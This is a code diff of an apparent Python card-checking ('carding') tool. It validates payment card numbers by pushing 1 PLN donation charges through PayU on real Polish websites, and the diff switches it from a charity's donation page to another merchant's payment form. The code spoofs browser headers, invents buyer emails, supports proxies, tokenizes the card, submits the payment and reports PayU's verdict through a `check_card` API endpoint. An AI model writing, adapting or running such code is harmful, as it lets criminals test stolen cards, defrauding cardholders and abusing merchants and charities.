@@ -72,7 +72,7 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
-    """Synchronous PayU charge check via fundacjakukuczki.pl donation page"""
+    """Synchronous PayU charge check via Alternative PayU PL Merchant"""
     session = requests.Session()
     try:
         email = _random_email()
@@ -88,14 +88,14 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create donation order ───
+        # ─── Step 1: Create order via ALTERNATIVE MERCHANT ───
         headers1 = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://fundacjakukuczki.pl',
-            'referer': 'https://fundacjakukuczki.pl/en/donations/payu/',
+            'origin': 'https://serwiskrs.pl',
+            'referer': 'https://serwiskrs.pl/',
             'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -108,13 +108,14 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         }
 
         data1 = {
-            'name': name,
+            'imie': name.split()[0] if ' ' in name else name,
+            'nazwisko': name.split()[1] if ' ' in name else '',
             'email': email,
-            'amount': '1',
-            'purpose': 'Pomoc Dariuszowi Glince',
+            'kwota': '1.00',
+            'opis': 'Donation',
         }
 
-        r1 = session.post('https://fundacjakukuczki.pl/payu-darowizna.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
+        r1 = session.post('https://serwiskrs.pl/payu.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
 
         order_id = None
         token = None
@@ -138,9 +139,9 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 token = tok.group(1)
 
         if not order_id or not token:
-            return 'Failed to extract orderId or token', {"error": "Could not parse order from fundacjakukuczki.pl"}
+            return 'Failed to extract orderId or token from new merchant', {"error": "Could not parse order", "status_code": r1.status_code, "body_snippet": r1.text[:500]}
 
-        # ─── Step 2: Load PayU pay page (DITAMBAH UNTUK DAPATKAN AMOUNT & CURRENCY SEBENAR) ───
+        # ─── Step 2: Load PayU pay page ───
         params2 = {
             'orderId': order_id,
             'token': token,
@@ -151,7 +152,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
-            'referer': 'https://fundacjakukuczki.pl/',
+            'referer': 'https://serwiskrs.pl/',
             'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -165,9 +166,9 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
         
-        # Cari amount dan currency sebenar dalam kod HTML laman pembayaran
-        final_amount = 100 # Default 1.00
-        final_currency = 'PLN' # Default Poland
+        # Auto-Reader untuk dapat exact amount & currency
+        final_amount = 100 # Default 1.00 PLN
+        final_currency = 'PLN'
         
         try:
             html_content = page_resp.text
@@ -179,7 +180,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             if curr_match:
                 final_currency = curr_match.group(1)
         except:
-            pass # Kalu tak jumpa, guna default je
+            pass
 
         # ─── Step 3: Tokenize card ───
         headers3 = {
@@ -228,15 +229,15 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
                 return f'Tokenization failed: {error_msg}', token_data
             return f'Failed to tokenize card', token_data
 
-        # ─── Step 4: Submit payment (MENGGUNAKAN DATA YANG DI-READ DARI HTML) ───
+        # ─── Step 4: Submit payment ───
         masked = cc[:6] + '*' * 6 + cc[-4:]
 
         json4 = {
             'email': email,
             'firstName': name.split()[0] if ' ' in name else name,
             'lastName': name.split()[1] if ' ' in name else '',
-            'currency': final_currency, # GUNA CURRENCY SEBENAR
-            'amount': final_amount,     # GUNA AMOUNT SEBENAR
+            'currency': final_currency,
+            'amount': final_amount,
             'payMethod': {
                 'type': 'c',
                 'token': card_token,
@@ -270,7 +271,6 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             except Exception:
                 pay_data = {"raw": r4.text, "status_code": r4.status_code}
 
-        # TAMBAHAN: Tangkap error tersembunyi dari PayU
         if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
             err_desc = pay_data.get('error', {}).get('description', '') if isinstance(pay_data.get('error'), dict) else str(pay_data.get('error', ''))
             return f'PayU Rejected: {pay_data.get("errorCode")} - {err_desc}', pay_data
@@ -314,7 +314,6 @@ def check_card(cc: str = Query(...)):
         yy = '20' + yy
         
     try:
-        # Fungsi sekarang return 2 benda: message dan raw_data
         message, raw_data = _payu_sync(card_num, mm, yy, cvv_code)
         return {
             "message": message,
